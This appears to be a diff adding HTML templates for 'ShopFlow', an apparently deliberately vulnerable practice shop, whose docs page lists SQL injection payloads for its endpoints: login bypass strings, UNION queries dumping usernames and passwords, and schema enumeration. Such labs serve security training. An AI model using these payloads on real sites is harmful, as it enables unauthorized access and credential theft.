@@ -1,0 +1,199 @@
+{{define "login.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}}</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Shop<span>Flow</span></a>
+  <nav><a href="/">← Back to store</a></nav>
+</header>
+<main>
+  <div class="form-wrap" style="margin-top:3rem">
+    <h1>Sign In</h1>
+    {{if .Error}}<div class="alert alert-error">{{.Error}}</div>{{end}}
+    {{if .Message}}<div class="alert alert-success">{{.Message}}</div>{{end}}
+    <form method="POST" action="/login">
+      <div class="field">
+        <label for="username">Username</label>
+        <input id="username" name="username" type="text" autocomplete="username" placeholder="Enter your username" required>
+      </div>
+      <div class="field">
+        <label for="password">Password</label>
+        <input id="password" name="password" type="password" autocomplete="current-password" placeholder="••••••••" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-full" style="margin-top:.5rem">Sign In</button>
+    </form>
+    <p style="text-align:center;margin-top:1.25rem;font-size:.875rem;color:var(--muted)">
+      Don't have an account? <a href="#" style="color:var(--primary)">Contact support</a>
+    </p>
+  </div>
+</main>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "search.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}}</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Shop<span>Flow</span></a>
+  <nav>
+    <a href="/products">Products</a>
+    <a href="/promo">Promo</a>
+    <a href="/login" class="cta">Sign In</a>
+  </nav>
+</header>
+<main>
+  <div class="section-head" style="margin-bottom:1.5rem">
+    <h2>Product Search</h2>
+  </div>
+
+  <form class="search-form" method="GET" action="/search">
+    <input name="q" type="text" placeholder="Search products…" value="{{if .Data}}{{.Data.Query}}{{end}}">
+    <button type="submit" class="btn btn-primary">Search</button>
+  </form>
+
+  {{if .Data.Error}}
+  <div class="alert alert-error" style="font-family:monospace;font-size:.85rem">{{.Data.Error}}</div>
+  {{end}}
+
+  {{if .Data.Rows}}
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr>
+      </thead>
+      <tbody>
+        {{range .Data.Rows}}
+        <tr>{{range .}}<td>{{.}}</td>{{end}}</tr>
+        {{end}}
+      </tbody>
+    </table>
+  </div>
+  {{else if .Data.Query}}
+  <p style="color:var(--muted)">No results found for "<strong>{{.Data.Query}}</strong>".</p>
+  {{end}}
+</main>
+<footer><p>© 2024 ShopFlow &nbsp;|&nbsp; <a href="/docs">Docs</a></p></footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "promo.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}}</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Shop<span>Flow</span></a>
+  <nav>
+    <a href="/products">Products</a>
+    <a href="/search">Search</a>
+    <a href="/login" class="cta">Sign In</a>
+  </nav>
+</header>
+<main>
+  <div class="form-wrap" style="margin-top:3rem">
+    <h1>Redeem Promo Code</h1>
+    <p style="color:var(--muted);margin-bottom:1.5rem">Enter your promotional code to receive a discount on your next purchase.</p>
+
+    {{if .Error}}<div class="alert alert-error">{{.Error}}</div>{{end}}
+    {{if .Message}}<div class="alert alert-success">{{.Message}}</div>{{end}}
+
+    <form method="POST" action="/promo">
+      <div class="field">
+        <label for="code">Promo Code</label>
+        <input id="code" name="code" type="text" placeholder="e.g. SUMMER20" style="text-transform:uppercase">
+        <p class="field-hint">Codes are case-sensitive. Check your email for your code.</p>
+      </div>
+      <button type="submit" class="btn btn-primary btn-full">Apply Code</button>
+    </form>
+
+    {{if .Data.Rows}}
+    <div class="table-wrap" style="margin-top:1.5rem">
+      <table>
+        <thead><tr>{{range .Data.Cols}}<th>{{.}}</th>{{end}}</tr></thead>
+        <tbody>{{range .Data.Rows}}<tr>{{range .}}<td>{{.}}</td>{{end}}</tr>{{end}}</tbody>
+      </table>
+    </div>
+    {{end}}
+  </div>
+</main>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
+
+{{define "docs.html"}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}}</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/">Shop<span>Flow</span></a>
+  <nav><a href="/">← Home</a></nav>
+</header>
+<main>
+  <div class="docs">
+    <h1>Pentest Notes – ShopFlow</h1>
+    <p class="subtitle">Internal exploitation reference for security assessors.</p>
+
+    <div class="vuln-card">
+      <h3><span class="tag">WHERE Injection</span> VULN-1 · Hidden Product Disclosure</h3>
+      <p>Endpoint: <code>GET /products?category=X</code><br>
+      The query filters with <code>AND released = 1</code>, hiding unreleased products.</p>
+      <div class="code-block">GET /products?category=Electronics'+OR+1=1--
+GET /products?category='+OR+released=0--
+GET /products?category='+UNION+SELECT+id,username,password,email,role+FROM+users--</div>
+    </div>
+
+    <div class="vuln-card">
+      <h3><span class="tag">Auth Bypass</span> VULN-2 · Login Bypass</h3>
+      <p>Endpoint: <code>POST /login</code> — both <code>username</code> and <code>password</code> fields are injectable.</p>
+      <div class="code-block">username=admin'--&password=anything
+username=' OR '1'='1'--&password=x
+username=' OR 1=1--&password=x</div>
+    </div>
+
+    <div class="vuln-card">
+      <h3><span class="tag union">UNION</span> VULN-3 · DB Version (Oracle sim) via Search</h3>
+      <p>Endpoint: <code>GET /search?q=X</code> — 2-column UNION. Oracle uses <code>v$version</code>; here use <code>version()</code>.</p>
+      <div class="code-block">GET /search?q='+UNION+SELECT+version(),NULL--
+GET /search?q='+UNION+SELECT+current_database(),current_user--
+GET /search?q='+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables--</div>
+    </div>
+
+    <div class="vuln-card">
+      <h3><span class="tag union">UNION</span> VULN-4 · DB Version (MySQL sim) via Promo</h3>
+      <p>Endpoint: <code>POST /promo</code> — <code>code</code> field. 2-column UNION. MySQL/MSSQL use <code>@@version</code>; PG uses <code>version()</code>.</p>
+      <div class="code-block">code=' UNION SELECT version(),'1'--
+code=' UNION SELECT current_user,'100'--
+code=' UNION SELECT table_name,'0'+FROM+information_schema.tables+LIMIT+1--</div>
+    </div>
+  </div>
+</main>
+<footer><p>© 2024 ShopFlow – Internal Use Only</p></footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
+{{end}}
